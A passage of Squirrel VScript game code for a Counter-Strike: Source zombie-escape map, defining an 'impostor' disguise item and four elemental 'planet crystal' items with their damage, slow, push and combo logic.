							EntFireByHandle(user,"AddOutput","health "+::Z_ITEM_HP.tostring(),0.00,null,null);
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						user.ValidateScriptScope();
						if("impostor_active" in user.GetScriptScope())return;
						if(::finale_started && !::colletivebosslogo_shown)return;	//NEW in v1_7 - disallow using it during early finale (allows it again once boss starts)
						if(::finale_post_impostor)return;							//NEW in v1_9 - disallow using it ~20s from the moment the boss dies
						if(::ENDINGS.CONFLICT.timer_started)						//NEW in v1_9 - disallow using it during the CONFLICT ending (kills it off too to allow other pickups)
						{
							EntFireByHandle(button,"Kill","",0.00,null,null);
							return;
						}
						button.GetScriptScope().cooldown = null;
						EntFireByHandle(button,"Kill","",0.00,null,null);
						::ITEMS.impostor.Activate(user);
					}
				}},hammerid);
		},
		function Activate(user)
		{
			if(user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=2)return;
			user.ValidateScriptScope();
			if("impostor_active" in user.GetScriptScope())return;
			::Ent(Vector(),Vector(),"logic_relay",{},{
				user = user,
				gottakill = false,
				killed = false,
				impostor_resetmodel = null,
				tp_pos = null,
				tp_vel = null,
				tp_yaw = null,
				count_reduced = false,
				impostor_revealed = false,
				function Tick(){
					if(gottakill)
					{
						killed = true;
						EntFireByHandle(self,"Kill","",0.05,null,null);
						if(!count_reduced)
						{
							count_reduced = true;
							::ITEMS.impostor.active_count--;
							if(::ITEMS.impostor.active_count>0)EntFire("server","Command","sv_disable_radar 1",0.00,null);
							else EntFire("server","Command","sv_disable_radar 0",0.00,null);
						}
						if(user==null||!user.IsValid()){}else
						{
							EntFireByHandle(user,"SetDamageFilter","",0.00,null,null);
							EntFireByHandle(user,"SetDamageFilter","",0.04,null,null);
							EntFireByHandle(user,"SetHealth","-1",0.02,null,null);
							EntFireByHandle(user,"SetHealth","-1",0.06,null,null);
							
							EntFireByHandle(user,"RemoveContext","safezombie",0.05,null,null);
							user.ValidateScriptScope();if("safezombie" in user.GetScriptScope())delete user.GetScriptScope()["safezombie"];
							
							EntFireByHandle(user,"RunScriptCode","if(\"poise\" in this)delete poise;",0.05,null,null);
							EntFireByHandle(user,"RunScriptCode","if(\"impostor_active\" in this)delete impostor_active;",0.05,null,null);
							::ITEMS.flight.UnListenTpBack(user);
							if(::ITEMS.impostor.active_count<=0)
							{
								if(!impostor_revealed)
									::PlayerNameMessage(user,""," was the impostor - good job finding and killing him before he managed to act!",0.00);
								else
									::PlayerNameMessage(user,""," (the impostor) is now dead - good job!",0.00);
							}
							else
							{
								if(!impostor_revealed)
									::PlayerNameMessage(user,""," was an impostor - good job finding and killing him before he managed to act!",0.00);
								else
									::PlayerNameMessage(user,""," (an impostor) is now dead - good job!",0.00);
							}
						}
						return;
					}
					EntFireByHandle(self,"RunScriptCode","Tick();",0.10,null,null);
					if(user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=2)
					{
						gottakill = true;
						return;
					}
					local hpcap = (0+::ITEMS.impostor.hpcap_base)+(::ITEMS.impostor.hpcap_each*::getplayercount_cache_ct);
					if(user.GetHealth()>hpcap)EntFireByHandle(user,"AddOutput","health "+hpcap.tostring(),0.00,null,null);
					
					//__CSS__ lazy dirty slut solution, this hides the radar for CT's every 0.10s (this tick)
					if(!impostor_revealed)	//radar stays hidden until revealed or dead
						for(local h;h=Entities.FindByClassname(h,"player");){
							if(h==null || !h.IsValid() || h.GetTeam()!=3)continue;
							::NetProps.SetPropFloat(h,"m_flFlashDuration",RandomFloat(0.30,0.80));
							::NetProps.SetPropFloat(h,"m_flFlashMaxAlpha",0.5);
						}
					
				},function TpUser(){
					if(killed||tp_pos==null||tp_vel==null||tp_yaw==null||user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=2)
					{
						gottakill = true;
						return;
					}
					user.SetOrigin(tp_pos);
					user.SetVelocity(tp_vel);
					user.SetAngles(0,tp_yaw,0);
				},function TpUserPost(){
					if(killed||user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=2)
					{
						gottakill = true;
						return;
					}
						//::Sound("*luffaren/sussy_baki.mp3",Vector(0,0,48),user,150000,5.00,RandomInt(98,102),10);		//OLD - positional audio
					::Sound("*luffaren/sussy_baki.mp3",Vector(0,0,48),null,0,5.00,RandomInt(98,102),10);				//NEW v1_9 - global audio
					::Particle("blood_spurt_synth_01",user.GetOrigin()+Vector(0,0,32),Vector(),null,0.10);
				},function ShowKiller(){
					if(killed||impostor_resetmodel==null||user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=2)
					{
						gottakill = true;
						return;
					}
					impostor_revealed = true;
					if(!count_reduced)
					{
						count_reduced = true;
						::ITEMS.impostor.active_count--;
						if(::ITEMS.impostor.active_count>0)EntFire("server","Command","sv_disable_radar 1",0.00,null);
						else EntFire("server","Command","sv_disable_radar 0",0.00,null);
					}
					//::manager.PrecacheModel(impostor_resetmodel);
					user.SetModel(impostor_resetmodel);
					
					EntFireByHandle(user,"RemoveContext","safezombie",0.00,null,null);
					user.ValidateScriptScope();if("safezombie" in user.GetScriptScope())delete user.GetScriptScope()["safezombie"];
					
					EntFireByHandle(user,"RunScriptCode","if(\"poise\" in this)delete poise;",0.00,null,null);
					EntFireByHandle(user,"SetDamageFilter","",0.00,null,null);
					EntFireByHandle(user,"SetDamageFilter","",0.10,null,null);
					::Sound("*luffaren/sussy_baki_amogus.mp3",Vector(0,0,48),user,150000,2.50,RandomInt(98,102),10);
					::PlayerNameMessage(user,""," revealed himself as an impostor, kill him before he kills you!",0.00);
				},function Run(){
					local hmodels = [];
					local cts = [];
					if(::ITEMS.impostor.force_model != null)
						hmodels.push(""+::ITEMS.impostor.force_model);
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
						cts.push(h);
						if(::ITEMS.impostor.force_model==null)
						{
							local blacklisted = false;
							foreach(blm in ::ITEMS.impostor.force_model_blacklist){if(blm==h.GetModelName()){blacklisted=true;break;}}
							if(!blacklisted)
								hmodels.push(h.GetModelName());
						}
					}
					if(hmodels.len()<=0||cts.len()<=0)
					{
						EntFireByHandle(self,"Kill","",0.05,null,null);
						return;
					}
					::ITEMS.impostor.active_count++;
					if(::ITEMS.impostor.active_count>0)EntFire("server","Command","sv_disable_radar 1",0.00,null);
					else EntFire("server","Command","sv_disable_radar 0",0.00,null);
					::ServerSay("say an impostor is among us...",0.00,null);
					::ServerSay("say find and kill him before it's too late!",1.01,null);
					EntFireByHandle(self,"RunScriptCode","Tick();",0.10,null,null);
					impostor_resetmodel = user.GetModelName();
					local rct = RandomInt(0,cts.len()-1);
					tp_pos = cts[rct].GetOrigin()+Vector(0,0,1);
					tp_vel = cts[rct].GetVelocity();
					tp_yaw = cts[rct].GetAngles().y;
					for(local i=0;i<::ITEMS.impostor.illusion_amount;i++){::SpawnPlayerIllusion(cts[RandomInt(0,cts.len()-1)],1,20);}
					
					EntFireByHandle(user,"AddContext","safezombie:1",0.00,null,null);
					user.ValidateScriptScope();user.GetScriptScope().safezombie <- true;
					
					user.ValidateScriptScope();
					user.GetScriptScope().impostor_active <- true;
					local hmodel = hmodels[RandomInt(0,hmodels.len()-1)];
					//::manager.PrecacheModel(hmodel);
					user.SetModel(hmodel);
					::ITEMS.flight.ListenTpBack(user);
					EntFireByHandle(self,"RunScriptCode","TpUser();",0.02,null,null);
					EntFireByHandle(self,"RunScriptCode","TpUserPost();",0.05,null,null);
					EntFireByHandle(self,"RunScriptCode","ShowKiller();",::ITEMS.impostor.hidden_time,null,null);
					if(::ITEMS.impostor.invincible_time==null||::ITEMS.impostor.invincible_time<=0.02){}else
					{
						user.GetScriptScope().poise <- true;
						EntFireByHandle(user,"RunScriptCode","if(\"poise\" in this)delete poise;",::ITEMS.impostor.invincible_time,null,null);
						EntFireByHandle(user,"SetDamageFilter","filter_ct_no",0.00,null,null);
					}
				}});
		}
	},
	planetcrystal = {
			team = 3,
		//[GENERAL LOGIC]
			
			//trigmins = "-50 -200 -100",		//the mins trigger size for fire+wind+water crystal
			//trigmaxs = "800 200 200",			//the maxs trigger size for fire+wind+water crystal
			trigmins = Vector(-50,-200,-100),	//__CSS__ use vectors instead
			trigmaxs = Vector(800,200,200),		//__CSS__ use vectors instead
			
			
		//[CAPTAIN PLANET LOGIC]
		//- every time 'earth' is used, the combo starts/resets, then fire>wind>water must be used nearby within the correct order+time+distance
		//- doing this successfully will spawn captain planet who TP's around/kicks zombie ass for ~20s or so, at the end all humans get a hp buff too
			combo_timeout = 7.00,			//the time you have to use the next item (in the earth>fire>wind>water combo), each correct use resets the timer
			combo_distance = 1500,			//the distance you must use the items within (for fire+wind+water, relative from the earth-use-position), to combo
			captain_rate = 0.30,			//how fast the captain teleports around beating the living shit out of the zombies
			captain_damage = 4600,			//how much damage the captain deals to a random zombie each 'rate'^
			captain_smash_upvel = 500,		//the Z-velocity to set on zombies when kicked (upwards)
			captain_smash_downvel = 700,	//the Z-velocity to set on zombies when kicked (downwards, delayed by 'downdelay')
			captain_smash_downdelay = 0.50,	//how long to wait before running 'downvel'^ after running 'upvel'^ on zombies)
			captain_ct_hpbuff = 100,		//how much health to set to humans once he says "the power is YOURS" at the end (for humans below this value)
			captain_target_boss = true,		//set to 'true' to make the captain 100% aggro the boss (if it exists)(if multiple bosses exist, randomly pick one each tick, just like z's)
			captain_boss_damage = 300,		//if 'captain_target_boss' is true, deal this much damage to the boss every 'rate'^
		//[EARTH LOGIC]
			earth_proctimings = [0.01,0.02,0.03],		//0:enable trigger, 1:disable trigger, 2:run post logic
			earth_forward_dist = 100,					//how far ahead of the user to spawn the earth-wall
			earth_tpdeny_dist = 210,					//if earth is spawned within this range of the zombie TP, deny spawning or break if spawned (preventing TP-cheese)
			earth_lifetime = 12.00,						//how long to keep the earth-wall up
			earth_allow_topwalk = false,				//set to 'true' to allow humans walking on top of the earth, else it breaks on-walk (only for humans)
			earth_autobreak_sides = true,				//set to 'true' to make the pieces break when touched from the sides by humans (preventing sideways-trolling)
			earth_bosshit_radius = 300,
			earth_bosshit_damage = 10,
			earth_bosshit_stunchance = 100.00,
			earth_bosshit_stuntime_add = 12.00,
		//[FIRE LOGIC]
			fire_ignitetime = 10.00,					//how long to stay burning
			fire_damage = 6500,							//how much extra damage to deal on-touch
			fire_slowamount = -0.60,					//how much speedmod to reduce for zombies
			fire_slowtime = 3.00,						//how long the speedmod should be reduced for zombies
			fire_bosshit_radius = 400,
			fire_bosshit_damage = 20000,
			fire_bosshit_stunchance = 40.00,
			fire_bosshit_stuntime_add = 3.00,
		//[WIND LOGIC]
					//OLD:
				//wind_xyvel = 700,							//the XY velocity to set for zombies on-touch (in push direction)
				//wind_zvel = 300,							//the Z velocity to set for zombies on-first-touch (251 is good to force a "jump")
				//wind_iterations = 7,						//how many pushes to run for each zombie it hits (it also sets 20 Z-up vel each iteration to stay mid-air)
				//wind_rate = 0.20,							//the rate to run each push-iteration
					//NEW:
				wind_pushspeed = 600,						//the trigger_push speed for the wind-push
				wind_lifetime = 2.00,						//the trigger_push lifetime for the wind-push
				wind_fx_rate = 0.07,						//the fx-model fadeout-rate for the wind (match this with the lifetime)
			wind_gustkill_radius = 500,
			wind_bosshit_radius = 400,
			wind_bosshit_damage = 3000,
			wind_bosshit_stunchance = 30.00,
			wind_bosshit_stuntime_add = 10.00,
		//[WATER LOGIC]
					//OLD:
				//water_stoptime = 10.00,					//how long the water should stop the zombie XY-velocity for
				//water_stoprate = 0.20,					//how often the water should stop the zombie XY-velocity during the stoptime^
					//NEW:
				water_slowamount = -0.85,					//how much speedmod to reduce for zombies
				water_slowtime = 10.00,						//how long the speedmod should be reduced for zombies
			water_bosshit_radius = 400,
			water_bosshit_damage = 50000,
			water_bosshit_stunchance = 50.00,
			water_bosshit_stuntime_add = 6.00,
		shuffle = [],
		combotime = 0.00,
		combopos = null,
		combocurrent = 0,
		comboticking = false,
		combotickrate = 0.20,
		type_info = null,
		function Spawn(pos,type=null){//null:pickrandomshuffle, 1:earth, 2:fire, 3:wind, 4:water
			if(type_info==null)
				type_info = [
					{name = "EarthCrystal",	hammerid=21,	color=Vector(200,150,0),
							description = "Spawns a wall just in front of you\n3 tiles wide, 2 tiles tall, stays up for "+earth_lifetime.tostring()+"s"+
							"\nAuto-breaks by certain human touches (anti-grief)\nAuto-breaks near main-teleport\nCan hurt/stun boss"},
					{name = "FireCrystal",	hammerid=22,	color=Vector(255,0,0),		
							description = "Damage heavily + set zombies on fire for "+fire_ignitetime.tostring()+"s\n"+
							"It also slows zombies slightly for "+fire_slowtime.tostring()+"s\n"+
							"The fire shoots out towards your front\nIt also stops the zombie-velocity on-first-touch\nCan hurt/stun boss"},
					{name = "WindCrystal",	hammerid=23,	color=Vector(255,255,255),
							description = "Push zombies back with a single wind gust\nThe wind shoots out towards your front"+
							"\nIt's active/stationary for "+wind_lifetime.tostring()+"s\nCancels z-gust projectiles\nCan hurt/stun boss"},
					{name = "WaterCrystal",	hammerid=24,	color=Vector(0,255,255),
							description = "Stop + slow zombies heavily for "+water_slowtime.tostring()+"s\n"+
							"The water shoots out towards your front\nIt deals no damage, only slowdown\nCan hurt/stun boss"},
				];
			if(type==null)
			{
				if(shuffle.len()<=0)shuffle=[1,2,3,4];
				local shuffle_index = RandomInt(0,shuffle.len()-1);
				type = 0+shuffle[shuffle_index];
				shuffle.remove(shuffle_index);
			}
			local hammerid = type_info[type-1].hammerid;
			::CreateItem(pos,Vector(),1,type_info[type-1].name,"(1x)\n"+type_info[type-1].description,{
				type=type,
				model=null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{holder=holder,function Clean(){EntFireByHandle(holder,"Kill","",0.00,null,null);}});
						//button.PrecacheModel("models/luffaren/planetcrystal.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/planetcrystal.mdl",
								rendermode = 3,		//was 1 in v1_5
								modelscale = 0.75,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.01,null,null);
								EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);
								EntFireByHandle(self,"AddOutput","glowdist 10000",0.00,null,null);
								EntFireByHandle(self,"AddOutput","glowstyle 2",0.00,null,null);
								local col = ::ITEMS.planetcrystal.type_info[logic.type-1].color;
								local colstr = ""+col.x.tostring()+" "+col.y.tostring()+" "+col.z.tostring().tostring();
								EntFireByHandle(self,"AddOutput","glowcolor "+colstr,0.00,null,null);
								EntFireByHandle(self,"AddOutput","rendercolor "+colstr,0.00,null,null);
								EntFireByHandle(self,"AddOutput","renderamt 100",0.00,null,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = null;
						EntFireByHandle(model,"Kill","",0.02,null,null);
						EntFireByHandle(button,"Kill","",1.00,null,null);
						::ITEMS.planetcrystal.RegisterCombo(button,type);
						local soundlist = [
								"*luffaren/cplanet_earth.mp3",
								"*luffaren/cplanet_fire.mp3",
								"*luffaren/cplanet_wind.mp3",
								"*luffaren/cplanet_water.mp3",
							];
						for(local i=0;i<3;i++)
							::Sound(soundlist[type-1],Vector(),button,10000,1.00,100,10);
						::Particle("muzzle_rifles",model.GetOrigin(),Vector(),null,0.10);
						if(type==1)//------------------- earth
						{
							::HurtStunBoss(	button.GetOrigin()+(button.GetForwardVector()*100)+Vector(0,0,100),
								::ITEMS.planetcrystal.earth_bosshit_radius,::ITEMS.planetcrystal.earth_bosshit_damage,
								::ITEMS.planetcrystal.earth_bosshit_stunchance,::ITEMS.planetcrystal.earth_bosshit_stuntime_add,null);
							::PlayerNameMessage(user,""," used EarthCrystal",0.00);
							for(local i=0;i<4;i++)
							{
								local spos = button.GetOrigin()+(button.GetForwardVector()*::ITEMS.planetcrystal.earth_forward_dist);
								local srot = Vector(90,button.GetAngles().y,0);
								local side1 = true;
								if(i%2){srot.y += 90;side1=false;}
								else srot.y -= 90;
								if(i>=2)spos.z += 96;
								
								
								//__CSS__ OOB trigger rotation is fucked (but thankfully it doesn't seem to have broken this along 0,90,180,270)):
								::Ent(spos,srot,"trigger_multiple",{
										spawnflags = 1,
										filtername = "filter_ct",
										targetname = "i_earthcrystal_earth",	//RunScriptcode 'Clean()' to this to clean safely!
									},{
									touchers = [],
									postchecked = false,
									model = null,
									side1 = side1,
									function TPcheckTick(){
										EntFireByHandle(self,"RunScriptCode"," TPcheckTick(); ",0.20,null,null);
										if(Entities.FindByNameNearest("tpdest_indicator",self.GetOrigin(),::ITEMS.planetcrystal.earth_tpdeny_dist)!=null)
										{
											EntFireByHandle(self,"FireUser1","",0.00,null,null);
											return;
										}
									},function PostCheck(){
										postchecked = true;
										if(touchers.len()>0)
										{
											EntFireByHandle(self,"FireUser1","",0.00,null,null);
											return;
										}
										EntFireByHandle(self,"RunScriptCode"," TPcheckTick(); ",0.00,null,null);
										EntFireByHandle(self,"Enable","",0.10,null,null);
										local model = ::TILEVARIANTS["BREAKABLE"][::THEME].main[RandomInt(0,::TILEVARIANTS["BREAKABLE"][::THEME].main.len()-1)];
										//self.PrecacheModel(model);
										::Ent(self.GetOrigin(),self.GetAngles(),"prop_physics_override",{
												model = model,
												spawnflags = 10,	//8:"motion disabled" + 2:"don't take physics damage"
												body = 1,			//gives it the cracked body
												DisableBoneFollowers = true,
											},{
											trigger = self,
											function Run(){
												if(trigger==null||!trigger.IsValid())
												{
													EntFireByHandle(self,"Kill","",0.00,null,null);
													return;
												}
												trigger.GetScriptScope().model = self;
											}});
									},function Touch(){
										local toucher = activator;	//__CSS__ activator may get reset, store toucher
										if(toucher==null||!toucher.IsValid())return;
										if(!postchecked)
										{
											touchers.push(toucher);
											return;
										}
										EntFireByHandle(self,"FireUser1","",0.00,null,null);
									},function Clean(){
										EntFireByHandle(self,"Kill","",0.00,null,null);
										if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
									},function Run(){
										EntFireByHandle(self,"AddOutput","OnUser1 !self:RunScriptCode:Clean();:0:1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										local topdist = 46;
										local side_dist = 94;
										local side_dist_inner = 2;
										if(::ITEMS.planetcrystal.earth_autobreak_sides)
										{
											side_dist = 160;
											side_dist_inner = -10;
										}
										if(!::ITEMS.planetcrystal.earth_allow_topwalk)topdist = 80;
										if(side1)
										{
											EntFireByHandle(self,"AddOutput","mins -"+topdist.tostring()+" -46 "+side_dist_inner.tostring()+"",0.00,null,null);
											EntFireByHandle(self,"AddOutput","maxs 60 80 "+side_dist.tostring()+"",0.00,null,null);
										}
										else
										{
											EntFireByHandle(self,"AddOutput","mins -"+topdist.tostring()+" -80 "+side_dist_inner.tostring()+"",0.00,null,null);
											EntFireByHandle(self,"AddOutput","maxs 60 46 "+side_dist.tostring()+"",0.00,null,null);
										}
										EntFireByHandle(self,"Enable","",::ITEMS.planetcrystal.earth_proctimings[0],null,null);
										EntFireByHandle(self,"Disable","",::ITEMS.planetcrystal.earth_proctimings[1],null,null);
										EntFireByHandle(self,"RunScriptCode"," PostCheck(); ",::ITEMS.planetcrystal.earth_proctimings[2],null,null);
										EntFireByHandle(self,"FireUser1","",::ITEMS.planetcrystal.earth_lifetime,null,null);
									}});
								
								
								
							}
							::Sound("*physics/concrete/concrete_break2.wav",button.GetOrigin(),null,10000,0.10,RandomInt(200,255),10);
							::Sound("*physics/concrete/concrete_break2.wav",button.GetOrigin(),null,10000,0.10,RandomInt(70,80),10);
							::Sound("*physics/concrete/concrete_break2.wav",button.GetOrigin(),null,10000,0.10,RandomInt(90,110),10);
						}
						else if(type==2)//-------------- fire
						{
							::HurtStunBoss(	button.GetOrigin()+(button.GetForwardVector()*300)+Vector(0,0,100),
								::ITEMS.planetcrystal.fire_bosshit_radius,::ITEMS.planetcrystal.fire_bosshit_damage,
								::ITEMS.planetcrystal.fire_bosshit_stunchance,::ITEMS.planetcrystal.fire_bosshit_stuntime_add,null);
							for(local h;h=Entities.FindByNameWithin(h,"item_dragonslayer",button.GetOrigin()+
							(button.GetForwardVector()*150),::ITEMS.dragonslayer.firecrystal_range);)
							{
								if(h==null||!h.IsValid())continue;
								h.ValidateScriptScope();
								h.GetScriptScope().holder.GetScriptScope().logic.firestate += (0.00+::ITEMS.dragonslayer.firecrystal_time_add);
								//printl("::ITEMS.dragonslayer - firecrystal HIT - firestate added by: += "+(0.00+::ITEMS.dragonslayer.firecrystal_time_add));
							}
							for(local h;h=Entities.FindByNameWithin(h,"i_claymore",button.GetOrigin()+
							(button.GetForwardVector()*150),::ITEMS.claymore.firecrystal_range);)
							{
								if(h==null||!h.IsValid())continue;
								h.ValidateScriptScope();
								h.GetScriptScope().dmgmult += (0.00+::ITEMS.claymore.firecrystal_dmgmult_add);
								if(h.GetScriptScope().dmgmult > ::ITEMS.claymore.firecrystal_dmgmult_max)h.GetScriptScope().dmgmult = (0.00+::ITEMS.claymore.firecrystal_dmgmult_max);
								//printl("::ITEMS.claymore - firecrystal HIT - dmgmult added by: += "+(0.00+::ITEMS.claymore.firecrystal_dmgmult_add));
								
								//__CSS__ no glow exists.. tint it red instead
								EntFireByHandle(h,"AddOutput","rendercolor 255 0 0",0.00,null,null);
								//EntFireByHandle(h,"AddOutput","rendermode 1",0.00,null,null);
								//EntFireByHandle(h,"AddOutput","glowenabled 1",0.00,null,null);
								//EntFireByHandle(h,"AddOutput","glowdist 5000",0.00,null,null);
								//EntFireByHandle(h,"AddOutput","glowstyle 3",0.00,null,null);
								//EntFireByHandle(h,"AddOutput","glowcolor 200 50 0",0.00,null,null);
							}
							
							
							
							
							//__CSS__ OOB trigger rotation is fucked (replacement logic):
							::TriggerScan(button.GetOrigin(),button.GetAngles(),::ITEMS.planetcrystal.trigmins,::ITEMS.planetcrystal.trigmaxs,
								"filter_non_invincible_t",{
								tr = button,
								user = user,
								function Scanned(list){
									foreach(toucher in list)
									{
										if(toucher==null||!toucher.IsValid())return;
										toucher.ValidateScriptScope();
										if("invincible" in toucher.GetScriptScope())return;
										toucher.SetVelocity(Vector());
										if(::ITEMS.planetcrystal.fire_ignitetime>0.00)
											EntFireByHandle(toucher,"IgniteLifeTime",::ITEMS.planetcrystal.fire_ignitetime.tostring(),0.00,null,null);
										EntFire("manager","RunScriptCode",
											" AddSpeed("+::ITEMS.planetcrystal.fire_slowamount.tostring()+","+::ITEMS.planetcrystal.fire_slowtime.tostring()+"); ",
											0.00,toucher);
										local newhp = (toucher.GetHealth()-(::ITEMS.planetcrystal.fire_damage * ::HURTPLAYER_mult_t));
										if(newhp<=0)::HurtPlayer(toucher,999999,tr.GetOrigin(),RandomInt(200,400),user,"firecrystal");
										else toucher.SetHealth(newhp);
											//DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins(),self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,5.00);
									}
								}},false);
							
							
							//__CSS__ OOB trigger rotation is fucked (old logic):
							/*::Ent(button.GetOrigin(),button.GetAngles(),"trigger_multiple",{
									spawnflags = 1,
									filtername = "filter_non_invincible_t",
								},{
								user = user,
								function Touch(){
									local toucher = activator;	//__CSS__ activator may get reset, store toucher
									if(toucher==null||!toucher.IsValid())return;
									toucher.ValidateScriptScope();
									if("invincible" in toucher.GetScriptScope())return;
									toucher.SetVelocity(Vector());
									if(::ITEMS.planetcrystal.fire_ignitetime>0.00)
										EntFireByHandle(toucher,"IgniteLifeTime",::ITEMS.planetcrystal.fire_ignitetime.tostring(),0.00,null,null);
									EntFire("manager","RunScriptCode",
										" AddSpeed("+::ITEMS.planetcrystal.fire_slowamount.tostring()+","+::ITEMS.planetcrystal.fire_slowtime.tostring()+"); ",
										0.00,toucher);
									local newhp = toucher.GetHealth()-::ITEMS.planetcrystal.fire_damage;
									if(newhp<=0)::HurtPlayer(toucher,999999,self.GetOrigin(),RandomInt(200,400),user,"firecrystal");
									else toucher.SetHealth(newhp);
										//DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins(),self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,5.00);
								},function Run(){
									EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
									EntFireByHandle(self,"AddOutput","mins "+::ITEMS.planetcrystal.trigmins,0.00,null,null);
									EntFireByHandle(self,"AddOutput","maxs "+::ITEMS.planetcrystal.trigmaxs,0.00,null,null);
									EntFireByHandle(self,"Enable","",0.05,null,null);
									EntFireByHandle(self,"Kill","",0.20,null,null);
								}});*/
							
							
							
							::Sound("*weapons/molotov/fire_ignite_5.wav",button.GetOrigin(),null,10000,0.10,RandomInt(80,120),10);
							::Sound("*weapons/molotov/fire_ignite_5.wav",button.GetOrigin(),null,10000,0.10,RandomInt(80,120),10);
							::ITEMS.planetcrystal.SpawnCrystalEffect(button.GetOrigin(),button.GetAngles(),0);
									//OLD PRE-MODEL
								//for(local i=0;i<4;i++)
								//	::Particle("molotov_explosion_child_fireball"+i.tostring(),button.GetOrigin(),
								//		button.GetAngles()+Vector(-20,RandomFloat(-15,15),0),null,0.10);
								//for(local i=100;i<500;i+=75)
								//::Particle("explosion_molotov_air",button.GetOrigin()+(button.GetForwardVector()*i)+Vector(0,0,40),
								//	button.GetAngles()+Vector(-20,RandomFloat(-15,15),0),null,0.10);
						}
						else if(type==3)//-------------- wind
						{
							for(local h;h=Entities.FindByNameWithin(h,"i_gust",button.GetOrigin()+(button.GetForwardVector()*200),
								::ITEMS.planetcrystal.wind_gustkill_radius);){EntFireByHandle(h,"FireUser1","",0.00,null,null);}
							::HurtStunBoss(	button.GetOrigin()+(button.GetForwardVector()*0)+Vector(0,0,100),
								::ITEMS.planetcrystal.wind_bosshit_radius,::ITEMS.planetcrystal.wind_bosshit_damage,
								::ITEMS.planetcrystal.wind_bosshit_stunchance,::ITEMS.planetcrystal.wind_bosshit_stuntime_add,null);
							
							
							/*	//OLD TRIGGER (v1_5 and older):
							::Ent(button.GetOrigin(),button.GetAngles(),"trigger_multiple",{
									spawnflags = 1,
									filtername = "filter_t",
								},{
								function Touch(){
									local toucher = activator;	//__CSS__ activator may get reset, store toucher
									if(toucher==null||!toucher.IsValid())return;
									toucher.ValidateScriptScope();
									if("invincible" in toucher.GetScriptScope())return;
									toucher.GetScriptScope().windcrystal_vel <- (self.GetForwardVector()*::ITEMS.planetcrystal.wind_xyvel);
									toucher.GetScriptScope().windcrystal_amount <- (0+::ITEMS.planetcrystal.wind_iterations);
									toucher.GetScriptScope().windcrystal_Tick <- function()
									{
										windcrystal_amount--;
										if(windcrystal_amount<0)return;
										EntFireByHandle(self,"RunScriptCode"," windcrystal_Tick(); ",::ITEMS.planetcrystal.wind_rate,null,null);
										local vel = windcrystal_vel+Vector(0,0,20);
										self.SetVelocity(vel);
									}
									toucher.SetVelocity((self.GetForwardVector()*::ITEMS.planetcrystal.wind_xyvel)+
										Vector(0,0,::ITEMS.planetcrystal.wind_zvel));
									EntFireByHandle(toucher,"RunScriptCode"," windcrystal_Tick(); ",::ITEMS.planetcrystal.wind_rate,null,null);
										//DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins(),self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,5.00);
								},function Run(){
									EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
									EntFireByHandle(self,"AddOutput","mins "+::ITEMS.planetcrystal.trigmins,0.00,null,null);
									EntFireByHandle(self,"AddOutput","maxs "+::ITEMS.planetcrystal.trigmaxs,0.00,null,null);
									EntFireByHandle(self,"Enable","",0.05,null,null);
									EntFireByHandle(self,"Kill","",0.20,null,null);
								}});
							*/
							
							
							
							
							
							
							
							
							
							
							
							
							//__CSS__ css5_pushreplacement - no more push triggers, instead trigger_multiple with .SetVelocity in think, allows for filtering
							::Ent(button.GetOrigin(),button.GetAngles(),"trigger_multiple",{
									spawnflags = 1,
									filtername = "filter_t",
									targetname = "i_planetcrystal_wind",
								},{
								speed = (0+::ITEMS.planetcrystal.wind_pushspeed),
								pushdir = ::AnglesToDir(button.GetAngles()),
								touchers = {},
								function Touch(){
									local eidx = activator.entindex();
									if(eidx in touchers)return;
									touchers[eidx] <- activator;
								},
								function UnTouch(){
									local eidx = activator.entindex();
									if(eidx in touchers)delete touchers[eidx];
									activator.ValidateScriptScope();
									if("invincible" in activator.GetScriptScope())return;
									activator.SetVelocity(Vector());
								},
								function Think(){
									foreach(i,t in touchers){
										if(t==null||!t.IsValid()||!t.IsAlive()||t.GetTeam()!=2)continue;
										t.ValidateScriptScope();
										if("invincible" in t.GetScriptScope())continue;
										local dirspeed = t.GetVelocity().Dot(this.pushdir);
